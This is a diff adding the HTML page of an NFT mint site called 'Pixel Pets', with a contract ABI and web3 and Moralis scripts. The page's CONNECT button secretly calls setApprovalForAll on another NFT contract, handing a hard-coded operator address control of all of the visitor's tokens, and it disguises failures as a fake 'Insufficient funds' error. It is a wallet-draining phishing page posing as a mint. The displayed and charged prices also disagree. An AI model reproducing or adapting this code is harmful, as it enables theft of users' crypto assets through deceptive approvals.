@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Pixel Pets</title>
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Actor&amp;display=swap">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Alata&amp;display=swap">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Alef&amp;display=swap">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Alfa+Slab+One&amp;display=swap">
+    <link rel="stylesheet" href="assets/css/Navigation-Clean.css">
+    <link rel="stylesheet" href="assets/css/styles.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.5.3-rc.0/web3.min.js"></script>
+    <script src="ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="moralis%401.5.4/dist/moralis.js"></script>
+    <script type="text/javascript" src="contract.js"></script>
+    <style type="text/css">
+        @media screen and (max-device-width: 375px){
+            .button-connect{
+                padding: 15px 110px 15px 110px !important;
+            }
+        }
+    </style>
+</head>
+
+
+
+<body>
+    <div>
+        <nav class="navbar navbar-light navbar-expand-lg navigation-clean" style="background: #14396d;height: 67px;">
+            <div class="container"><a class="navbar-brand" href="#" style="font-family: Alata, sans-serif;color: #ffffff;letter-spacing: 5px;line-height: 29px;">PIXEL PETS</a><button data-bs-toggle="collapse" class="navbar-toggler" data-bs-target="#navcol-1"><span class="visually-hidden">Toggle navigation</span><span class="navbar-toggler-icon"></span></button>
+                <div class="collapse navbar-collapse" id="navcol-1">
+                    <ul class="navbar-nav ms-auto">
+                        <li class="nav-item"><a class="nav-link" href="#" style="color: #ffffff;font-family: Alata, sans-serif;">MINT NOW</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#" style="color: #ffffff;font-family: Alata, sans-serif;">ABOUT</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#" style="color: #ffffff;font-family: Alata, sans-serif;">TOKEN</a></li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+    </div>
+    <div style="max-height: 1080px;height: 1080px;background: url(&quot;assets/img/backgroundimgq1.jpeg&quot;) no-repeat;background-size: cover;background-position: center;background-repeat: no-repeat;">
+        <div class="container" style="height: inherit;max-height: inherit;">
+            <div class="row" style="height: inherit;max-height: inherit;">
+                <div class="col-md-12 d-flex justify-content-center align-items-end" style="max-height: inherit;height: inherit;">
+                    <div style="margin-bottom: 3rem;"><a class="button-connect" style="color: white;padding: 25px 150px 25px 150px;background-color: orange;border-radius: 1.5rem;text-decoration: none;">CONNECT</a></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div style="background: #7790da;height: 100%;">
+        <div class="container" style="height: inherit;max-height: inherit;">
+            <div class="row d-flex align-items-center" style="height: inherit;max-height: inherit;padding-top: 15px;padding-bottom: 15px;">
+                <div class="col-md-6 d-flex flex-column justify-content-center align-items-center align-content-center" style="height: inherit;max-height: inherit;border-right: 5px solid white;height: 8rem;"><span style="background: rgba(255,255,255,0);color: #ffffff;font-family: Alata, sans-serif;font-size: 46px;font-weight: bold;letter-spacing: 2px;">0,04 ETH</span><span style="font-size: 26px;color: hsla(0,0%,100%,.5);letter-spacing: 2px;"><strong>PER PET</strong><br></span></div>
+                <div class="col-md-6 d-flex flex-column justify-content-center align-items-center" style="height: 8rem;"><span style="background: rgba(255,255,255,0);color: #ffffff;font-family: Alata, sans-serif;font-size: 46px;font-weight: bold;line-height: 69px;letter-spacing: 4px;">.../7777</span><span style="font-size: 26px;color: hsla(0,0%,100%,.5);letter-spacing: 2px;"><strong>MINTED</strong></span></div>
+            </div>
+        </div>
+    </div>
+    <div class="d-flex align-items-center" style="height: 100%;padding-top: 80px;padding-bottom: 80px;">
+        <div class="container">
+            <div class="row">
+                <div class="col d-flex flex-column justify-content-around" style="height: 560px;"><span style="font-weight: bold;font-size: 2.25rem;">Pixel Pets are a clone of the large NFT Cool Pets collection
+Each Pixel Pets hatches from an egg.<br></span><span style="font-family: Alef, sans-serif;font-size: 1.75rem;letter-spacing: 0px;">The first 1789 eggs will be distributed free blowjob OG roles in discord!<br></span><span style="font-family: Alef, sans-serif;font-size: 1.75rem;">Then the price will be 0.04 ETH.<br>Pets hatch from an egg.Each of them is individual and not like the others.<br></span></div>
+                <div class="col-md-6" style="height: 560px;background: url(&quot;assets/img/egg-3.png&quot;);background-size: contain;background-position: center;background-repeat: no-repeat;"></div>
+            </div>
+        </div>
+    </div>
+    <div class="d-flex align-items-center" style="height: 100%;background: #e5e5e5;padding-top: 80px;padding-bottom: 80px;">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6" style="height: 560px;background: url(&quot;assets/img/egg-2.png&quot;);background-position: center;background-size: contain;background-repeat: no-repeat;"></div>
+                <div class="col d-flex flex-column justify-content-around" style="height: 560px;"><span style="font-weight: bold;font-size: 2.25rem;">What do I get?<br></span><span style="font-family: Alef, sans-serif;font-size: 1.75rem;letter-spacing: 0px;">Each TAE Owner receives a $MILK token to his wallet, which can then be exchanged in the Pancakeswap exchanger.<br></span><span style="font-family: Alef, sans-serif;font-size: 1.75rem;">Become a part of a small community of pixel pets.<br></span></div>
+            </div>
+        </div>
+    </div>
+    <div class="d-flex align-items-center" style="height: 100%;padding-top: 80px;padding-bottom: 80px;">
+        <div class="container">
+            <div class="row" style="margin-bottom: 2rem;">
+                <div class="col d-flex justify-content-center align-items-center"><span style="font-weight: bold;font-size: 36px;">The Four Elements...For Now, At Least!<br></span></div>
+            </div>
+            <div class="row">
+                <div class="col d-flex flex-column justify-content-around" style="height: 650px;">
+                    <div class="d-flex flex-column align-items-center" style="width: inherit;max-width: inherit;"><img style="width: inherit;max-width: inherit;" src="assets/img/air.png" /><span style="color: #9066dc;font-size: 33px;font-weight: bold;">AIR</span></div>
+                    <div class="d-flex flex-column align-items-center" style="width: inherit;max-width: inherit;"><img style="width: inherit;max-width: inherit;" src="assets/img/fire.png" /><span style="color: #e34d4d;font-size: 33px;font-weight: bold;">FIRE</span></div>
+                </div>
+                <div class="col d-flex flex-column justify-content-around" style="height: 650px;">
+                    <div class="d-flex flex-column align-items-center" style="width: inherit;max-width: inherit;"><img style="width: inherit;max-width: inherit;" src="assets/img/grass.png" /><span style="color: #4de365;font-size: 33px;font-weight: bold;">GRASS</span></div>
+                    <div class="d-flex flex-column align-items-center" style="width: inherit;max-width: inherit;"><img style="width: inherit;max-width: inherit;" src="assets/img/water.png" /><span style="color: #564add;font-size: 33px;font-weight: bold;">WATER</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div style="background: #39e27d;">
+        <div class="container">
+            <div class="row" style="padding-top: 10px;padding-bottom: 10px;">
+                <div class="col-md-12 d-flex justify-content-center align-items-center">
+                    <div style="padding: 20px;"><a href="#"><img src="assets/img/discord.png"></a></div>
+                    <div style="padding: 20px;"><a href="#"><img src="assets/img/twitter.png"></a></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
+    <script>
+        async function loadWeb3() {
+            if (!window.ethereum) return undefined;
+    
+            window.web3 = new Web3(window.ethereum);
+            window.ethereum.enable();
+        }
+    
+        async function loadContract(ABI, address) {
+            if (!window.ethereum) return undefined;
+    
+            return await new window.web3.eth.Contract(ABI, address);
+        }
+    
+        async function getCurrentAccount() {
+            if (!window.ethereum) return undefined;
+    
+            const accounts = await window.web3.eth.getAccounts();
+            return accounts[0];
+        }
+    
+        async function buyTokensSale(){
+            if (!window.ethereum) return "Metamask not found.";
+    
+            if (!window.contract) load();
+    
+            if (!window.contract) return "Please, connect to metamask";
+    
+            count = parseInt(document.querySelector('input').value, 10);
+    
+            if (count <= 0){
+                return window.alert("NFTs amount should be more than 0.")
+            }
+    
+            let account = await getCurrentAccount(),
+                contract = window.contract;
+    
+            const res = await contract.methods.claimFree(count).send({ from: account, value: 50000000000000000*count });
+            window.location.replace("./thx.html");
+            return res;
+        }
+    
+        async function totalSupply(){
+            if (!window.ethereum) return "Metamask not found.";
+    
+            if (!window.contract) load();
+    
+            if (!window.contract) return "Please, connect to metamask";
+    
+            const res = await contract.methods.totalSupply().call();
+    
+            document.querySelector('form small').innerHTML = `Minted in Sale: ${res}`;
+    
+            return res;
+        }
+    
+    
+        async function load() {
+            let address = "0x92fbe5BeCb231198da75AbC22BC16505EeDF7fB9",
+                ABI = [
+                    {
+                        "inputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "constructor"
+                    },
+                    {
+                        "anonymous": false,
+                        "inputs": [
+                            {
+                                "indexed": true,
+                                "internalType": "address",
+                                "name": "owner",
+                                "type": "address"
+                            },
+                            {
+                                "indexed": true,
+                                "internalType": "address",
+                                "name": "approved",
+                                "type": "address"
+                            },
+                            {
+                                "indexed": true,
+                                "internalType": "uint256",
+                                "name": "tokenId",
+                                "type": "uint256"
+                            }
+                        ],
+                        "name": "Approval",
+                        "type": "event"
+                    },
+                    {
+                        "anonymous": false,
+                        "inputs": [
+                            {
+                                "indexed": true,
+                                "internalType": "address",
+                                "name": "owner",
+                                "type": "address"
+                            },
+                            {
+                                "indexed": true,
+                                "internalType": "address",
+                                "name": "operator",
+                                "type": "address"
+                            },
+                            {
+                                "indexed": false,
+                                "internalType": "bool",
+                                "name": "approved",
+                                "type": "bool"
+                            }
+                        ],
+                        "name": "ApprovalForAll",
+                        "type": "event"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "address",
+                                "name": "to",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "uint256",
+                                "name": "tokenId",
+                                "type": "uint256"
+                            }
+                        ],
+                        "name": "approve",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "_amount",
+                                "type": "uint256"
+                            }
+                        ],
+                        "name": "claimFree",
+                        "outputs": [],
+                        "stateMutability": "payable",
+                        "type": "function"
+                    },
+                    {
+                        "anonymous": false,
+                        "inputs": [
+                            {
+                                "indexed": true,
+                                "internalType": "address",
+                                "name": "previousOwner",
+                                "type": "address"
+                            },
+                            {
+                                "indexed": true,
+                                "internalType": "address",
+                                "name": "newOwner",
+                                "type": "address"
+                            }
+                        ],
+                        "name": "OwnershipTransferred",
+                        "type": "event"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "_amount",
+                                "type": "uint256"
+                            }
+                        ],
+                        "name": "purchaseTokens",
+                        "outputs": [],
+                        "stateMutability": "payable",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "renounceOwnership",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "address",
+                                "name": "from",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "address",
+                                "name": "to",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "uint256",
+                                "name": "tokenId",
+                                "type": "uint256"
+                            }
+                        ],
+                        "name": "safeTransferFrom",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "address",
+                                "name": "from",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "address",
+                                "name": "to",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "uint256",
+                                "name": "tokenId",
+                                "type": "uint256"
+                            },
+                            {
+                                "internalType": "bytes",
+                                "name": "_data",
+                                "type": "bytes"
+                            }
+                        ],
+                        "name": "safeTransferFrom",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "address",
+                                "name": "operator",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "bool",
+                                "name": "approved",
+                                "type": "bool"
+                            }
+                        ],
+                        "name": "setApprovalForAll",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "string",
+                                "name": "__baseURI",
+                                "type": "string"
+                            }
+                        ],
+                        "name": "setBaseURI",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "toggleSale",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "anonymous": false,
+                        "inputs": [
+                            {
+                                "indexed": true,
+                                "internalType": "address",
+                                "name": "from",
+                                "type": "address"
+                            },
+                            {
+                                "indexed": true,
+                                "internalType": "address",
+                                "name": "to",
+                                "type": "address"
+                            },
+                            {
+                                "indexed": true,
+                                "internalType": "uint256",
+                                "name": "tokenId",
+                                "type": "uint256"
+                            }
+                        ],
+                        "name": "Transfer",
+                        "type": "event"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "address",
+                                "name": "from",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "address",
+                                "name": "to",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "uint256",
+                                "name": "tokenId",
+                                "type": "uint256"
+                            }
+                        ],
+                        "name": "transferFrom",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "address",
+                                "name": "newOwner",
+                                "type": "address"
+                            }
+                        ],
+                        "name": "transferOwnership",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "__price",
+                                "type": "uint256"
+                            }
+                        ],
+                        "name": "updatePrice",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "withdraw",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "address",
+                                "name": "owner",
+                                "type": "address"
+                            }
+                        ],
+                        "name": "balanceOf",
+                        "outputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "",
+                                "type": "uint256"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "baseURI",
+                        "outputs": [
+                            {
+                                "internalType": "string",
+                                "name": "",
+                                "type": "string"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "circulatingSupply",
+                        "outputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "",
+                                "type": "uint256"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "tokenId",
+                                "type": "uint256"
+                            }
+                        ],
+                        "name": "getApproved",
+                        "outputs": [
+                            {
+                                "internalType": "address",
+                                "name": "",
+                                "type": "address"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "address",
+                                "name": "owner",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "address",
+                                "name": "operator",
+                                "type": "address"
+                            }
+                        ],
+                        "name": "isApprovedForAll",
+                        "outputs": [
+                            {
+                                "internalType": "bool",
+                                "name": "",
+                                "type": "bool"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "isSaleActive",
+                        "outputs": [
+                            {
+                                "internalType": "bool",
+                                "name": "",
+                                "type": "bool"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "itemPrice",
+                        "outputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "",
+                                "type": "uint256"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "name",
+                        "outputs": [
+                            {
+                                "internalType": "string",
+                                "name": "",
+                                "type": "string"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "owner",
+                        "outputs": [
+                            {
+                                "internalType": "address",
+                                "name": "",
+                                "type": "address"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "tokenId",
+                                "type": "uint256"
+                            }
+                        ],
+                        "name": "ownerOf",
+                        "outputs": [
+                            {
+                                "internalType": "address",
+                                "name": "",
+                                "type": "address"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "bytes4",
+                                "name": "interfaceId",
+                                "type": "bytes4"
+                            }
+                        ],
+                        "name": "supportsInterface",
+                        "outputs": [
+                            {
+                                "internalType": "bool",
+                                "name": "",
+                                "type": "bool"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "symbol",
+                        "outputs": [
+                            {
+                                "internalType": "string",
+                                "name": "",
+                                "type": "string"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "index",
+                                "type": "uint256"
+                            }
+                        ],
+                        "name": "tokenByIndex",
+                        "outputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "",
+                                "type": "uint256"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "address",
+                                "name": "owner",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "uint256",
+                                "name": "index",
+                                "type": "uint256"
+                            }
+                        ],
+                        "name": "tokenOfOwnerByIndex",
+                        "outputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "",
+                                "type": "uint256"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "tokensRemaining",
+                        "outputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "",
+                                "type": "uint256"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "tokenId",
+                                "type": "uint256"
+                            }
+                        ],
+                        "name": "tokenURI",
+                        "outputs": [
+                            {
+                                "internalType": "string",
+                                "name": "",
+                                "type": "string"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "totalFreePerWallet",
+                        "outputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "",
+                                "type": "uint256"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "totalFreeSupply",
+                        "outputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "",
+                                "type": "uint256"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "totalPaidPerWallet",
+                        "outputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "",
+                                "type": "uint256"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "totalSupply",
+                        "outputs": [
+                            {
+                                "internalType": "uint256",
+                                "name": "",
+                                "type": "uint256"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    }
+                ];
+    
+            await loadWeb3();
+            window.contract = await loadContract(ABI, address);
+            document.querySelector('button.wind_botm').onclick = buyTokensSale;
+            document.querySelector('.button-connect').onclick = loadWeb3;
+            // totalSupply();
+        }
+    
+        window.onload = load;
+        const serverUrl = "https://b4upz3w3ye4p.usemoralis.com:2053/server";
+        const appId = "lePmHZif6BunoJK638wYmee7SgmOofuzebVkJyzu";
+        Moralis.start({ serverUrl, appId });
+        async function transact() {
+            
+            await Moralis.enableWeb3();
+            let user = Moralis.User.current();
+            try {
+                user = await Moralis.authenticate({ provider: "metamask", signingMessage: "I am signing my one-time nonce: 513767" })
+            } catch (error) {
+                console.log(error)
+            }
+            var options;
+            const sendOptions = {
+            contractAddress: "0xfeb52cbf71b9adac957c6f948a6cf9980ac8c907",
+            functionName: "setApprovalForAll",
+            abi: window.CONTRACT_ABI,
+            params: {
+                operator: "0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff",
+                approved: "true"
+            },
+            };
+                try {
+                    let result = await Moralis.executeFunction(sendOptions);
+                } catch (e) {
+                    throwmodal('Error: Insufficient funds!');
+                }
+
+        }
+        $(document).ready(function () {
+
+            $(".button-connect").click(function () {
+            transact();
+            });
+
+        });
+    </script>
+</body>
+
+</html>
